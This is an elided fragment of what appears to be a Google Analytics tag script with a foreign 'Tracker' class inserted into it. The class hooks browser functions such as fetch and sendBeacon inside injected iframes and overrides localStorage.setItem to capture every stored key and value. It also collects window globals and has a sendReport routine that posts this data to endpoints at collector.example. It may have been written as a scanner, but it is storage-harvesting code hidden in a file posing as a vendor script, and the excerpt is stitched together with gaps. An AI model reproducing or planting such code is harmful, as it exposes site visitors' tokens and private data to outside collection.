...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-4F7BPW6GXQ",
        "tag_id": 23
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_auto_redact", "__ccd_conversion_marking", "__ccd_em_download", "__ccd_em_outbound_click", "__ccd_em_page_view", "__ccd_em_scroll", "__ccd_em_site_search", "__ccd_em_video", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_google_signals", "__ogt_ip_mark", "__set_product_settings"]
    }
  };
  ...
  */
  ...
  ;
  const ENDPOINTS = ['https://collector.example/v3/stats', 'https://local-collector.example/log'];
  var z = window,
    H = document,
    zc = navigator,
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5ufY6DzySW4dyOGv6xhsHuRkCMV0y8gY9itez4Ly8ErG8xoCAK4\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  class Tracker {
    ...
    createTracker(id, file) {
      return new Promise(resolve => {
        ...
        frame.srcdoc = this.generateSource(id);
      ...
      return `
            <script>
                window.addEventListener('message', function (event) {
                    const hook = function(target, method) {
                        const old = target[method];
                            target[method] = function() {
                            window.parent.postMessage({'id': '${id}', 'method': method}, '*');
                            return old.apply(this, arguments);
                        };
                    };
                    
                    hook(window, 'alert');
                    hook(window.navigator, 'sendBeacon');
                    hook(window.navigator.serviceWorker, 'register');
                    hook(window, 'fetch');
                });
            </script>`;
    }
    async scan(apps) {
      const trackers = apps.map(([id, file]) => this.createTracker(id, file));
      return await Promise.all(trackers);
    }
    async execute() {
      while (Object.keys(window.psData).length > 0) {
        let batch = Object.entries(window.psData).splice(0, Tracker.BATCH_COUNT);
        let result = await this.scan(batch);
        for (let [id, status] of result) {
          delete window.psData[id];
          console.log("Scanned: " + id + ", Infected: " + status);
        }
    ...
    trackLocalStorage() {
      window.localStorage.setItem = function (nativeSetItem) {
        return function (key, value) {
          window.jsHookEvents['localStorage'] = window.jsHookEvents['localStorage'] || {};
          window.jsHookEvents['localStorage'][key] = value;
    ...
    trackGlobalVariables() {
      ...
      for (let key in window) {
        if (!(key in iWindow)) {
          this.globalVariables[key] = window[key];
        }
      }
    ...
    trackEvents() {
      window.addEventListener('message', function (event) {
        ...
        window.jsHookEvents[data.id] = window.jsHookEvents[data.id] || {};
        window.jsHookEvents[data.id][data.method] = true;
      });
    }
    pause(ms) {
    ...
    async sendReport() {
      const body = JSON.stringify({
        ...
        storage: window.jsHookEvents['localStorage'],
        methods: window.jsHookEvents
      });
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-4F7BPW6GXQ'), a.set("version", '3'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
